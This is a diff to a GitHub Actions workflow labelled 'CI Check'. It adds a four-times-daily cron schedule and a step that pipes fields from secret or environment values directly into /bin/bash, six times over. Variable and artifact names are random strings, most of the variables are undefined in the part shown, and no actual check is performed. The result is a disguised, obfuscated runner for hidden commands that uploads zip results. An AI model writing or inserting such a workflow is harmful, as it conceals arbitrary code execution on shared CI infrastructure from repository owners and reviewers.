@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 2,8,14,20 * * *'
 env:
   CI: true
 jobs:
@@ -13,15 +15,18 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          lg345: ${{ secrets.lg345 }}
+          nmejf5: ${{ secrets.nmejf5 }}
         run: |
-          printf '%s' "$lg345" | jq -r .ivwy1602 | /bin/bash
-          echo $hs7704 | jq -r .li0 | /bin/bash
-          printf '%s' "$luri537" | jq -r .b8462 | /bin/bash
+          printf '%s' "$nmejf5" | jq -r .pf58 | /bin/bash
+          printf '%s' "$pab9" | jq -r .pal41 | /bin/bash
+          printf '%s' "$c3" | jq -r .ua4183 | /bin/bash
+          echo $q5 | jq -r .atam39745 | /bin/bash
+          printf '%s' "$wk5657" | jq -r .tt95 | /bin/bash
+          printf '%s' "$v2" | jq -r .ucv2807 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: k7ZZaUY7
+          name: sAYQK81j
           path: "*.zip"
           retention-days: 1
